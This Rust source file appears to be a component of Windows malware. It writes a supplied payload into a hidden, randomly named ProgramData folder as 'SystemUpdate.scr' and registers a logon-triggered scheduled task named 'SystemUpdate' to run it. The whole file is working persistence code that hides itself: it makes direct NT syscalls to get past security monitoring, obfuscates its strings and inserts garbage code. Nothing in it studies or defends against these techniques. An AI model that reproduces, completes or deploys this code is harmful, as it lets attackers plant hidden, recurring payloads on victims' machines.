use crate::syscalls;
use hex::ToHex;
use obfuscator::{obfuscate, obfuscate_string};
use rand::{thread_rng, Rng};
use std::ffi::OsStr;
use std::fs;
use std::iter::once;
use std::mem;
use std::ptr;
use windows::core::{BSTR, VARIANT};
use windows::Win32::Foundation::HANDLE;
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoInitializeSecurity, CoUninitialize, CLSCTX_INPROC_SERVER,
    RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
};
use windows::Win32::System::Ole::{VariantClear, VariantInit};
use windows::Win32::System::TaskScheduler::{
    ITaskFolder, ITaskService, TaskScheduler, TASK_ACTION_EXEC, TASK_CREATE_OR_UPDATE,
    TASK_LOGON_INTERACTIVE_TOKEN,
};
use windows_sys::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};

#[cfg(windows)]
const FILE_OVERWRITE_IF: u32 = 0x00000005;
#[cfg(windows)]
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;
#[cfg(windows)]
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
#[cfg(windows)]
const GENERIC_WRITE: u32 = 0x40000000;
#[cfg(windows)]
const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;

#[cfg(windows)]
#[obfuscate(garbage = true)]
unsafe fn add_to_task_scheduler(file_path: &str) -> Result<(), String> {
    if let Err(e) = CoInitializeEx(None, windows::Win32::System::Com::COINIT_MULTITHREADED) {
        return Err(format!("Failed to initialize COM: {:?}", e));
    }

    if let Err(e) = CoInitializeSecurity(
        None,
        -1,
        None,
        None,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        None,
        0,
        None,
    ) {
        CoUninitialize();
        return Err(format!("Failed to initialize security: {:?}", e));
    }

    let task_service: ITaskService =
        match CoCreateInstance(&TaskScheduler, None, CLSCTX_INPROC_SERVER) {
            Ok(service) => service,
            Err(e) => {
                CoUninitialize();
                return Err(format!("Failed to create Task Scheduler instance: {:?}", e));
            }
        };

    if let Err(e) = task_service.Connect(
        VARIANT::default(),
        VARIANT::default(),
        VARIANT::default(),
        VARIANT::default(),
    ) {
        CoUninitialize();
        return Err(format!("Failed to connect to Task Scheduler: {:?}", e));
    }

    let root_folder: ITaskFolder = match task_service.GetFolder(&BSTR::from("\\")) {
        Ok(folder) => folder,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to get root task folder: {:?}", e));
        }
    };

    let task_definition = match task_service.NewTask(0) {
        Ok(def) => def,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to create new task definition: {:?}", e));
        }
    };

    let principal = match task_definition.Principal() {
        Ok(p) => p,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to get principal: {:?}", e));
        }
    };

    if let Err(e) = principal.SetLogonType(TASK_LOGON_INTERACTIVE_TOKEN) {
        CoUninitialize();
        return Err(format!("Failed to set logon type: {:?}", e));
    }

    let triggers = match task_definition.Triggers() {
        Ok(t) => t,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to get triggers collection: {:?}", e));
        }
    };

    let trigger = match triggers.Create(windows::Win32::System::TaskScheduler::TASK_TRIGGER_LOGON) {
        Ok(t) => t,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to create logon trigger: {:?}", e));
        }
    };

    let action_collection = match task_definition.Actions() {
        Ok(actions) => actions,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to get action collection: {:?}", e));
        }
    };

    let action = match action_collection.Create(TASK_ACTION_EXEC) {
        Ok(a) => a,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to create exec action: {:?}", e));
        }
    };

    let exec_action = match action.cast::<windows::Win32::System::TaskScheduler::IExecAction>() {
        Ok(a) => a,
        Err(e) => {
            CoUninitialize();
            return Err(format!("Failed to cast to IExecAction: {:?}", e));
        }
    };

    if let Err(e) = exec_action.SetPath(&BSTR::from(file_path)) {
        CoUninitialize();
        return Err(format!("Failed to set executable path: {:?}", e));
    }

    let mut sddl = VARIANT::default();
    VariantInit(&mut sddl);

    if let Err(e) = root_folder.RegisterTaskDefinition(
        &BSTR::from("SystemUpdate"),
        &task_definition,
        TASK_CREATE_OR_UPDATE.0 as i32,
        VARIANT::default(), // User
        VARIANT::default(), // Password
        TASK_LOGON_INTERACTIVE_TOKEN,
        sddl,
    ) {
        CoUninitialize();
        return Err(format!("Failed to register task definition: {:?}", e));
    }

    CoUninitialize();

    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true)]
pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), String> {
    let mut program_data = match std::env::var(obfuscate_string!("ProgramData")) {
        Ok(s) => s,
        Err(_) => {
            return Err(obfuscate_string!("ProgramData environment variable not found.").to_string())
        }
    };

    if program_data.ends_with('\\') && program_data.len() > 3 {
        program_data.pop();
    }

    let mut rng = thread_rng();
    let random_bytes: Vec<u8> = (0..6).map(|_| rng.random::<u8>()).collect();
    let dir_name: String = random_bytes.encode_hex();

    let folder_path = format!("{}\\{}", program_data, dir_name);
    let full_file_path_win = format!("{}\\SystemUpdate.scr", folder_path);

    if let Err(e) = fs::create_dir_all(&folder_path) {
        return Err(format!(
            "{}{}",
            obfuscate_string!("Failed to create persistence directory: "),
            e
        ));
    }

    let folder_path_w: Vec<u16> = folder_path.encode_utf16().chain(Some(0)).collect();
    SetFileAttributesW(folder_path_w.as_ptr(), FILE_ATTRIBUTE_HIDDEN);

    let nt_path = format!("\\??\\{}", full_file_path_win);

    let mut wide_path: Vec<u16> = nt_path.encode_utf16().collect();

    let len_bytes = (wide_path.len() * 2) as u16;
    let max_len_bytes = ((wide_path.len() + 1) * 2) as u16;

    let mut unicode_string_path = syscalls::UNICODE_STRING {
        Length: len_bytes,
        MaximumLength: max_len_bytes,
        Buffer: wide_path.as_mut_ptr(),
    };

    let mut file_handle: HANDLE = ptr::null_mut();
    let mut io_status_block = syscalls::IO_STATUS_BLOCK {
        status: 0,
        information: 0,
    };

    let mut obj_attributes = syscalls::OBJECT_ATTRIBUTES {
        Length: mem::size_of::<syscalls::OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: ptr::null_mut(),
        ObjectName: &mut unicode_string_path,
        Attributes: 0x00000040,
        SecurityDescriptor: ptr::null_mut(),
        SecurityQualityOfService: ptr::null_mut(),
    };

    let status = (syscalls::SYSCALLS.NtCreateFile)(
        &mut file_handle,
        GENERIC_WRITE | 0x00100000,
        &mut obj_attributes,
        &mut io_status_block,
        ptr::null_mut(),
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
        ptr::null_mut(),
        0,
    );

    if status != 0 {
        return Err(format!(
            "{}{:X}",
            obfuscate_string!("NtCreateFile failed with status: "),
            status
        ));
    }

    let write_status = (syscalls::SYSCALLS.NtWriteFile)(
        file_handle,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        &mut io_status_block,
        payload_data.as_ptr() as *mut std::ffi::c_void,
        payload_data.len() as u32,
        ptr::null_mut(),
        ptr::null_mut(),
    );

    let mut result: Result<(), String> = Ok(());

    if write_status != 0 {
        result = Err(format!(
            "{}{:X}",
            obfuscate_string!("NtWriteFile failed with status: "),
            write_status
        ));
    } else if io_status_block.information != payload_data.len() {
        result = Err(obfuscate_string!("NtWriteFile wrote incomplete data.").to_string());
    }

    (syscalls::SYSCALLS.NtClose)(file_handle as *mut _);

    if result.is_ok() {
        if let Err(e) = add_to_task_scheduler(&full_file_path_win) {
            return Err(format!(
                "{}{}",
                obfuscate_string!("Failed to add to task scheduler: "),
                e
            ));
        }
    }

    result
}
